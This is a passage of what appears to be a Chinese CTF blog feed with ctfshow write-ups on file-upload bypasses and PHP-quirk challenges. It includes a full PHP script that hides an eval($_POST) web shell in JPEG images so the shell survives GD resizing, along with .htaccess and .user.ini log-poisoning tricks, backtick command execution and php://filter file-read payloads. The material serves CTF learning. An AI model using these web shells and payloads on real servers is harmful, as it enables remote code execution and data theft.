class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment">    */</span><br> <br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;<br> <br> <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br> <br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br> <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br> <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>orz这题我在本地测试了很久都没有找到一个合适的jpg，就是通过这个脚本执行然后上传就行了，多找一些jpg进行尝试，成功率比较低因为有的文件可能会有特殊字符导致解析失败,我在本地没有打通</p><h2 id="web166"><a class="markdownIt-Anchor" href="#web166"></a> web166</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-btn&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">lay-data</span>=<span class="hljs-string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这题限制的是zip后缀，随便找个zip用txt在后面加个一句话木马即可，这题需要反复配合bp食用，首先上传的时候需要注意回显的zip名称，然后post对应的发包，可以多尝试几次，我在本地也测试了好几次</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20103904.png" alt="2024-09-20103904"></p><h2 id="web167"><a class="markdownIt-Anchor" href="#web167"></a> web167</h2><p>本题用的是阿帕奇的，所以使用<code>.htaccess</code>进行上传内容，图片限制是jpg可以看源码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span>  &quot;<span class="hljs-attr">shell.jpg</span>&quot;&gt;</span></span><br>SetHandler application/x-httpd-php<br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后就是正常的文件上传</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20110014.png" alt="2024-09-20110014"></p><h2 id="web168"><a class="markdownIt-Anchor" href="#web168"></a> web168</h2><p>加了一点姿势，过滤了<code>eval</code>,<code>system</code>,<code>post</code>,<code>get</code>,可以直接执行命令，反正也是知道具体的flag在哪的，同时本题又改为png上传</p><p>这题可以直接修改为php，先执行ls命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`ls ..`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>flag在flagaa.php里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../flagaa.php`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20112040.png" alt="2024-09-20112040"></p><h2 id="web169"><a class="markdownIt-Anchor" href="#web169"></a> web169</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-btn&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">lay-data</span>=<span class="hljs-string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>前端检测zip文件，后端要求png文件这题过滤了<code>&lt;</code>,这题的思路，大概就是上传一个zip</p><p>首先创建一个index.zip，上传之后修改为php并且把文件形式改成png</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20114308.png" alt="2024-09-20114308"></p><p>然后创建<code>.user.ini.zip</code>,里面的内容就是日志包含</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>auto<span class="hljs-emphasis">_prepend_</span>file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>上传之后和上面一样改，同时在UA里面进行修改写入一个马得到flag，flag在flagaa.php</p><h2 id="web170"><a class="markdownIt-Anchor" href="#web170"></a> web170</h2><p>和上一题基本一致</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-php特性</title>
    <link href="/2024/09/17/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshowphp%E7%89%B9%E6%80%A7/"/>
    <url>/2024/09/17/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshowphp%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="web89"><a class="markdownIt-Anchor" href="#web89"></a> web89</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num[]=a<br></code></pre></td></tr></table></figure><h2 id="web90"><a class="markdownIt-Anchor" href="#web90"></a> web90</h2><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=+4476<br></code></pre></td></tr></table></figure><h3 id="0x03"><a class="markdownIt-Anchor" href="#0x03"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476e1<br></code></pre></td></tr></table></figure><h3 id="0x04"><a class="markdownIt-Anchor" href="#0x04"></a> 0x04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=0x117c<br></code></pre></td></tr></table></figure><h2 id="web91"><a class="markdownIt-Anchor" href="#web91"></a> web91</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?cmd=%0aphp<br></code></pre></td></tr></table></figure><h2 id="web92"><a class="markdownIt-Anchor" href="#web92"></a> web92</h2><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476e1<br></code></pre></td></tr></table></figure><h2 id="web92-2"><a class="markdownIt-Anchor" href="#web92-2"></a> web92</h2><h3 id="0x01-3"><a class="markdownIt-Anchor" href="#0x01-3"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02-3"><a class="markdownIt-Anchor" href="#0x02-3"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=010574<br></code></pre></td></tr></table></figure><h2 id="web93"><a class="markdownIt-Anchor" href="#web93"></a> web93</h2><h3 id="0x01-4"><a class="markdownIt-Anchor" href="#0x01-4"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02-4"><a class="markdownIt-Anchor" href="#0x02-4"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=010574<br></code></pre></td></tr></table></figure><h2 id="web94"><a class="markdownIt-Anchor" href="#web94"></a> web94</h2><h3 id="0x01-5"><a class="markdownIt-Anchor" href="#0x01-5"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.02<br></code></pre></td></tr></table></figure><h3 id="0x02-5"><a class="markdownIt-Anchor" href="#0x02-5"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0a010574<br></code></pre></td></tr></table></figure><h2 id="web95"><a class="markdownIt-Anchor" href="#web95"></a> web95</h2><h3 id="0x01-6"><a class="markdownIt-Anchor" href="#0x01-6"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0a010574<br></code></pre></td></tr></table></figure><h3 id="0x02-6"><a class="markdownIt-Anchor" href="#0x02-6"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=+010574<br></code></pre></td></tr></table></figure><h2 id="web96"><a class="markdownIt-Anchor" href="#web96"></a> web96</h2><h3 id="0x01-7"><a class="markdownIt-Anchor" href="#0x01-7"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02-7"><a class="markdownIt-Anchor" href="#0x02-7"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=./flag.php<br></code></pre></td></tr></table></figure><h3 id="0x03-2"><a class="markdownIt-Anchor" href="#0x03-2"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=/var/www/html/flag.php<br></code></pre></td></tr></table></figure><h2 id="web97"><a class="markdownIt-Anchor" href="#web97"></a> web97</h2><h3 id="0x01-8"><a class="markdownIt-Anchor" href="#0x01-8"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><h3 id="0x02-8"><a class="markdownIt-Anchor" href="#0x02-8"></a> 0x02</h3><p>用fastcoll进行生成</p><h2 id="web98"><a class="markdownIt-Anchor" href="#web98"></a> web98</h2><p>按要求进行传参就行了，cookie，post,FLAG，等等</p><h2 id="web99"><a class="markdownIt-Anchor" href="#web99"></a> web99</h2><p>先了解一下in_array函数，如图</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-15215426.png" alt="2024-09-15215426"></p><p>in_array是用于检查数组里有没有对应的内容，正常是需要传三个值，第一个值是要搜索的值，可以是字符串、整数等。第二个值是要搜索的数组，即是否存在这个数组，第三个是可选当设置为 <code>true</code> 时，<code>in_array()</code> 不仅检查值是否相同，还会检查类型是否相同。如果未设置或为 <code>false</code>，则不会比较类型。本题就是由于第三个没有导致的弱比教漏洞</p><p>所以根据题目要求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?n=1.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>然后进入1.php执行ls，最后执行得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=system(<span class="hljs-string">&#x27;tac flag36d.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web100"><a class="markdownIt-Anchor" href="#web100"></a> web100</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0&amp;v2=show_source(system(<span class="hljs-string">&#x27;ls&#x27;</span>))&amp;v3=;<br></code></pre></td></tr></table></figure><p>测试完忘记读题，在$ctfshow里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0&amp;v2=var_dump(<span class="hljs-variable">$ctfshow</span>)&amp;v3=;<br></code></pre></td></tr></table></figure><h2 id="web101"><a class="markdownIt-Anchor" href="#web101"></a> 